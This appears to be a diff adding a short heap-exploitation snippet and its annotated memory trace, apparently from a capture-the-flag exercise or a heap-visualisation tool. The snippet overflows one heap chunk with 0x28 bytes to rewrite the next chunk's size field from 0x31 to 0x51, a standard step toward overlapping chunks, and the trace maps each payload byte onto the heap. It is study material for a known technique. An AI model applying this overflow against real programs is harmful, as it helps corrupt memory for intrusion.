@@ -1,0 +1,13 @@
+add(0x20, b'A')
+add(0x20, b'B')
+payload = b'A' * 0x28 + p64(0x51)
+edit(0, payload)
+A request=0x20 original=0x30 current=0x30
+B request=0x20 original=0x30 current=0x50
+top=heap_base+0x2f0 size=top_size [derived]
+write_0003 op_003 dst=heap_base+0x2a0 len=0x30
+  payload[0x0:0x28] b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+  payload[0x28:0x30] b'Q\x00\x00\x00\x00\x00\x00\x00'
+  payload+0x0 -> A.user[0x0] heap_base+0x2a0..heap_base+0x2c0: unknown -> b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+  payload+0x20 -> B.prev_size heap_base+0x2c0..heap_base+0x2c8: unknown -> 0x4141414141414141
+  payload+0x28 -> B.size heap_base+0x2c8..heap_base+0x2d0: 0x31 -> 0x51
